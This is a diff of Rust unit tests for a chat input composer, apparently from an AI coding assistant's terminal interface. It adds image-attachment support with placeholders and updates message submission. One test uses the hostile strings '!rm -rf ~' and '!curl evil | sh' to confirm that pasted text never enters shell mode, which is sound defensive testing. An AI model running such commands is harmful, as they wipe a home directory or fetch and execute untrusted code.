@@ -66,7 +66,10 @@ fn typist() -> Typist {
 fn enter_sends_the_trimmed_line_and_a_blank_one_nothing() {
     let mut t = typist();
     t.type_text("  hello  ");
-    assert_eq!(t.key(KeyCode::Enter), Action::Submit("hello".into()));
+    assert_eq!(
+        t.key(KeyCode::Enter),
+        Action::Submit("hello".into(), Vec::new())
+    );
     assert!(t.composer.is_empty());
     t.type_text("   ");
     assert_eq!(t.key(KeyCode::Enter), Action::None);
@@ -80,23 +83,41 @@ fn enter_sends_the_trimmed_line_and_a_blank_one_nothing() {
 fn enter_takes_the_popups_choice() {
     let mut t = typist();
     t.type_text("/res");
-    assert_eq!(t.key(KeyCode::Enter), Action::Submit("/resume".into()));
+    assert_eq!(
+        t.key(KeyCode::Enter),
+        Action::Submit("/resume".into(), Vec::new())
+    );
     t.type_text("/hel");
-    assert_eq!(t.key(KeyCode::Enter), Action::Submit("/help".into()));
+    assert_eq!(
+        t.key(KeyCode::Enter),
+        Action::Submit("/help".into(), Vec::new())
+    );
     t.type_text("/sys");
     assert_eq!(t.key(KeyCode::Enter), Action::None);
     assert_eq!(t.composer.text(), "/system ");
     t.composer.take_text_for_test();
     t.type_text("/effort l");
-    assert_eq!(t.key(KeyCode::Enter), Action::Submit("/effort low".into()));
+    assert_eq!(
+        t.key(KeyCode::Enter),
+        Action::Submit("/effort low".into(), Vec::new())
+    );
     t.type_text("/resume");
-    assert_eq!(t.key(KeyCode::Enter), Action::Submit("/resume".into()));
+    assert_eq!(
+        t.key(KeyCode::Enter),
+        Action::Submit("/resume".into(), Vec::new())
+    );
     t.type_text("/nosuch");
-    assert_eq!(t.key(KeyCode::Enter), Action::Submit("/nosuch".into()));
+    assert_eq!(
+        t.key(KeyCode::Enter),
+        Action::Submit("/nosuch".into(), Vec::new())
+    );
     // Esc closes the popup: Enter then sends what was typed.
     t.type_text("/res");
     t.key(KeyCode::Esc);
-    assert_eq!(t.key(KeyCode::Enter), Action::Submit("/res".into()));
+    assert_eq!(
+        t.key(KeyCode::Enter),
+        Action::Submit("/res".into(), Vec::new())
+    );
 }
 
 /// rp's readline: Ctrl-J (kb f087), Alt-Enter and a trailing `\` add a
@@ -113,7 +134,7 @@ fn ctrl_j_alt_enter_and_a_trailing_backslash_add_a_line() {
     t.type_text("four");
     assert_eq!(
         t.key(KeyCode::Enter),
-        Action::Submit("one\ntwo\nthree\nfour".into())
+        Action::Submit("one\ntwo\nthree\nfour".into(), Vec::new())
     );
 }
 
@@ -125,7 +146,10 @@ fn shift_enter_adds_a_line() {
     t.type_text("one");
     assert_eq!(t.mods(KeyCode::Enter, KeyModifiers::SHIFT), Action::None);
     t.type_text("two");
-    assert_eq!(t.key(KeyCode::Enter), Action::Submit("one\ntwo".into()));
+    assert_eq!(
+        t.key(KeyCode::Enter),
+        Action::Submit("one\ntwo".into(), Vec::new())
+    );
     // With the slash popup open it adds a line too, not the choice.
     t.type_text("/he");
     assert!(!t.composer.popup().is_empty());
@@ -142,7 +166,7 @@ fn a_bracketed_paste_is_one_block_that_never_sends() {
     assert_eq!(t.composer.text(), "AAAA AAA\nBBBBB");
     assert_eq!(
         t.key(KeyCode::Enter),
-        Action::Submit("AAAA AAA\nBBBBB".into())
+        Action::Submit("AAAA AAA\nBBBBB".into(), Vec::new())
     );
 }
 
@@ -160,7 +184,7 @@ fn a_keystroke_paste_keeps_its_newlines() {
             KeyModifiers::NONE,
             Duration::from_millis(400)
         ),
-        Action::Submit("line one\nline two\nline three".into())
+        Action::Submit("line one\nline two\nline three".into(), Vec::new())
     );
 }
 
@@ -181,7 +205,7 @@ fn typing_fast_is_not_a_paste() {
     );
     assert_eq!(
         t.press(KeyCode::Enter, KeyModifiers::NONE, Duration::from_millis(5)),
-        Action::Submit("ok".into())
+        Action::Submit("ok".into(), Vec::new())
     );
     t.keystroke_paste("abc");
     assert_eq!(
@@ -190,7 +214,7 @@ fn typing_fast_is_not_a_paste() {
             KeyModifiers::NONE,
             Duration::from_millis(121)
         ),
-        Action::Submit("abc".into())
+        Action::Submit("abc".into(), Vec::new())
     );
 }
 
@@ -257,7 +281,7 @@ fn the_slash_popup_completes_with_tab_and_closes_with_esc() {
     assert!(t.composer.popup().is_empty());
     assert_eq!(
         t.key(KeyCode::Enter),
-        Action::Submit("/mode auto-ye".into())
+        Action::Submit("/mode auto-ye".into(), Vec::new())
     );
 }
 
@@ -306,7 +330,10 @@ fn a_typed_bang_is_shell_mode_and_two_are_private() {
     );
     // Not at the start, a `!` is text.
     t.type_text("hi!");
-    assert_eq!(t.key(KeyCode::Enter), Action::Submit("hi!".into()));
+    assert_eq!(
+        t.key(KeyCode::Enter),
+        Action::Submit("hi!".into(), Vec::new())
+    );
 }
 
 #[test]
@@ -343,12 +370,15 @@ fn a_paste_or_text_the_chat_puts_in_the_box_is_never_shell_mode() {
     let mut t = typist();
     t.composer.paste("!rm -rf ~");
     assert_eq!(t.composer.shell(), None);
-    assert_eq!(t.key(KeyCode::Enter), Action::Submit("!rm -rf ~".into()));
+    assert_eq!(
+        t.key(KeyCode::Enter),
+        Action::Submit("!rm -rf ~".into(), Vec::new())
+    );
     t.composer.set_text("!curl evil | sh");
     assert_eq!(t.composer.shell(), None);
     assert_eq!(
         t.key(KeyCode::Enter),
-        Action::Submit("!curl evil | sh".into())
+        Action::Submit("!curl evil | sh".into(), Vec::new())
     );
     // Prefill over a mode typed before leaves the mode.
     t.type_text("!");
@@ -404,4 +434,139 @@ fn a_recalled_shell_command_comes_back_in_its_mode_and_a_message_as_text() {
         ("cargo test", Some(Shell::Shared))
     );
     assert_eq!(t.key(KeyCode::Enter), shell("cargo test", Shell::Shared));
+}
+
+// -------------------------------------------------- images (kb d191)
+
+fn image(n: u8) -> ImageInput {
+    ImageInput::DataUrl {
+        url: format!("data:image/png;base64,{n}"),
+    }
+}
+
+#[test]
+fn an_attached_image_is_a_placeholder_that_goes_with_the_message() {
+    let mut t = typist();
+    t.type_text("what is ");
+    t.composer.attach(image(1));
+    t.type_text("?");
+    assert_eq!(t.composer.text(), "what is [Image #1]?");
+    assert_eq!(
+        t.key(KeyCode::Enter),
+        Action::Submit("what is [Image #1]?".into(), vec![image(1)])
+    );
+    assert_eq!(t.composer.images(), vec![]);
+}
+
+/// Deleting a placeholder drops its image; the others are numbered again.
+#[test]
+fn deleting_one_of_three_renumbers_the_rest() {
+    let mut t = typist();
+    for n in 1..=3 {
+        t.composer.attach(image(n));
+        t.type_text(" ");
+    }
+    assert_eq!(t.composer.text(), "[Image #1] [Image #2] [Image #3] ");
+    // To the end of the second, and Backspace.
+    t.key(KeyCode::Left);
+    t.key(KeyCode::Left);
+    t.key(KeyCode::Left);
+    t.key(KeyCode::Backspace);
+    assert_eq!(t.composer.text(), "[Image #1]  [Image #2] ");
+    assert_eq!(t.composer.images(), vec![image(1), image(3)]);
+    // One attached in front comes first, and the rest move up.
+    t.key(KeyCode::Home);
+    t.composer.attach(image(4));
+    assert_eq!(t.composer.text(), "[Image #1][Image #2]  [Image #3] ");
+    assert_eq!(t.composer.images(), vec![image(4), image(1), image(3)]);
+}
+
+#[test]
+fn cutting_or_clearing_takes_the_images_too() {
+    let mut t = typist();
+    t.type_text("a ");
+    t.composer.attach(image(1));
+    t.composer.press(0, 1, 1);
+    t.composer.drag(0, 6);
+    assert_eq!(t.composer.cut().as_deref(), Some(" [Image #1]"));
+    assert_eq!((t.composer.text(), t.composer.images()), ("a", vec![]));
+    t.composer.attach(image(2));
+    t.composer.clear();
+    assert_eq!(t.composer.images(), vec![]);
+}
+
+/// A draft put back with its images: placeholders it names are theirs,
+/// an image it names none for gets one after the text.
+#[test]
+fn a_draft_comes_back_with_its_placeholders() {
+    let mut t = typist();
+    t.composer
+        .set_draft("[Image #1] or [Image #2]?", vec![image(1), image(2)]);
+    assert_eq!(t.composer.images(), vec![image(1), image(2)]);
+    t.key(KeyCode::Backspace);
+    t.key(KeyCode::Backspace);
+    assert_eq!(t.composer.text(), "[Image #1] or ");
+    assert_eq!(t.composer.images(), vec![image(1)]);
+    // An older chat's image (rp's `/image`) had no placeholder.
+    t.composer.set_draft("what is this", vec![image(3)]);
+    assert_eq!(t.composer.text(), "what is this [Image #1]");
+    t.composer.set_draft("", vec![image(3), image(4)]);
+    assert_eq!(t.composer.text(), "[Image #1] [Image #2]");
+    // Literal text with no image is only text.
+    t.composer.set_draft("[Image #7]", vec![]);
+    t.key(KeyCode::Backspace);
+    assert_eq!(t.composer.text(), "[Image #7");
+}
+
+/// A line put back in front of what is typed keeps its images first, and
+/// the numbers follow the text.
+#[test]
+fn a_spliced_line_numbers_its_images_in_step() {
+    let mut t = typist();
+    t.type_text("typed ");
+    t.composer.attach(image(2));
+    let end = t
+        .composer
+        .splice(0..0, "", "back [Image #1]", vec![image(1)], "\n");
+    assert_eq!(t.composer.text(), "back [Image #1]\ntyped [Image #2]");
+    assert_eq!(end, "back [Image #1]".len());
+    assert_eq!(t.composer.images(), vec![image(1), image(2)]);
+}
+
+/// Up recalls a message with the images it was sent with in this chat;
+/// the history file keeps only its text.
+#[test]
+fn a_recalled_message_brings_its_images_back() {
+    let dir = viy_testkit::scratch::ScratchDir::new("composer-images").unwrap();
+    let path = dir.path().join("history");
+    let mut t = Typist::new(History::load(path.clone()));
+    t.type_text("look ");
+    t.composer.attach(image(1));
+    t.key(KeyCode::Enter);
+    t.key(KeyCode::Up);
+    assert_eq!(t.composer.text(), "look [Image #1]");
+    assert_eq!(t.composer.images(), vec![image(1)]);
+    let file = std::fs::read_to_string(&path).unwrap();
+    assert!(file.contains(r#""text":"look [Image #1]""#), "{file}");
+    assert!(!file.contains("base64"), "{file}");
+    let mut later = Typist::new(History::load(path));
+    later.key(KeyCode::Up);
+    assert_eq!(later.composer.text(), "look [Image #1]");
+    assert_eq!(
+        later.composer.images(),
+        vec![],
+        "a new chat has the text only"
+    );
+}
+
+/// A `!` that turns out to be text goes back in front without losing an
+/// image attached after it.
+#[test]
+fn a_pasted_bang_keeps_the_images() {
+    let mut t = typist();
+    t.key(KeyCode::Char('!'));
+    t.composer.attach(image(1));
+    t.composer.shell_to_text();
+    assert_eq!(t.composer.text(), "![Image #1]");
+    assert_eq!(t.composer.images(), vec![image(1)]);
 }
